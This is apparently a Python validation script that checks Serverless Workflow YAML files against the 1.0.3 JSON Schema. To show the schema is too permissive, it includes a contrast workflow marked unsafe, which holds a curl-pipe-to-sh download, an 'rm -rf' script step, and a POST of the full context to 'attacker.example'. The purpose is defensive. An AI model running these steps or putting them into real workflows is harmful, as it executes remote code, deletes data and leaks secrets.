"""Validate the Serverless Workflow files here against the official 1.0.3 JSON Schema.

Run: uv run --no-project --with jsonschema==4.26.0 --with pyyaml==6.0.3 python check_sw.py

Also validates two contrasts: a workflow that runs a script and calls any URL (valid, so we would
have to forbid it) and Zigflow's own quickstart workflow (which adds fields the schema refuses).
"""

import json
import urllib.request
from pathlib import Path

import yaml
from jsonschema import Draft202012Validator

SCHEMA_URL = (
    "https://raw.githubusercontent.com/serverlessworkflow/specification/v1.0.3/schema/workflow.yaml"
)
HERE = Path(__file__).parent

UNSAFE = """
document: {dsl: '1.0.3', namespace: demo, name: unsafe, version: '1.0.0'}
do:
  - shell:
      run:
        shell: {command: 'curl -s https://example.com/x | sh'}
  - script:
      run:
        script: {language: python, code: 'import os; os.system("rm -rf /tmp/x")'}
  - anyEndpoint:
      call: http
      with: {method: post, endpoint: 'https://attacker.example/collect', body: '${ $context }'}
  - clock:
      set: {at: '${ now }'}
"""

# Zigflow's quickstart (README.md, "Create a workflow"), verbatim.
ZIGFLOW_QUICKSTART = """
document:
  dsl: 1.0.0
  taskQueue: zigflow
  workflowType: hello-world
  version: 1.0.0
do:
  - greet:
      output:
        as:
          data: ${ . }
      set:
        message: Hello from Ziggy
"""


def report(name: str, document: object, validator: Draft202012Validator) -> None:
    errors = sorted(validator.iter_errors(document), key=lambda e: list(e.path))
    if not errors:
        print(f"{name}: valid")
        return
    print(f"{name}: {len(errors)} error(s)")
    for error in errors[:5]:
        where = "/".join(str(p) for p in error.absolute_path) or "(root)"
        print(f"  at {where}: {error.message[:160]}")


def main() -> None:
    with urllib.request.urlopen(SCHEMA_URL) as response:
        schema = yaml.safe_load(response.read())
    validator = Draft202012Validator(schema)
    for path in sorted(HERE.glob("*.sw.yaml")):
        report(path.name, yaml.safe_load(path.read_text()), validator)
    report("unsafe (script, shell, any URL, clock)", yaml.safe_load(UNSAFE), validator)
    report("zigflow quickstart", yaml.safe_load(ZIGFLOW_QUICKSTART), validator)
    print(json.dumps({"schema": SCHEMA_URL}))


if __name__ == "__main__":
    main()
